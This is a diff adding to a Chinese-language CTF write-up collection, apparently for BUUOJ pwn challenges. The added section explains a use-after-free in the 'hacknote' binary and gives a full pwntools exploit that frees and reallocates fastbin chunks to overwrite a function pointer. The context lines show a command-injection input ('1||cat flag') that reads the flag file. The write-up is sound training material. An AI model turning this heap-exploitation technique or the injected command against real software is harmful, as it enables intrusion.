@@ -289,3 +289,44 @@ p.interactive()
 ### bjdctf_2020_router
 
 从stdin读取字符串当作命令执行，没有过滤。直接输入 `1||cat flag` 即可~
+
+### hitcontraining_uaf
+
+正如题目的名字，释放内存之后没有对相关的指针变量置零。利用 fastbin 使得 glibc分配重叠的内存，从而修改结构体的函数指针。
+
+```python
+#!/usr/bin/python3.6
+from pwn import *
+from LibcSearcher import LibcSearcher
+
+filename = './hacknote'
+# p = process(filename)
+p = remote('node3.buuoj.cn', 29142)
+elf = ELF(filename)
+
+
+def add(content, size=None):
+    if size is None:
+        size = len(content)
+    p.sendlineafter(b'Your choice :', b'1')
+    p.sendlineafter(b'Note size :', bytes(f'{size}', encoding='utf8'))
+    p.sendlineafter(b'Content :', content)
+
+def del_(index):
+    p.sendlineafter(b'Your choice :', b'2')
+    p.sendlineafter(b'Index :', bytes(f'{index}', encoding='utf8'))
+
+def put(index):
+    p.sendlineafter(b'Your choice :', b'3')
+    p.sendlineafter(b'Index :', bytes(f'{index}', encoding='utf8'))
+
+magic_addr = 0x08048945
+
+add(b'a'*16)
+add(b'b'*16)
+del_(0)
+del_(1)
+add(p32(magic_addr), 8)
+put(0)
+p.interactive()
+```
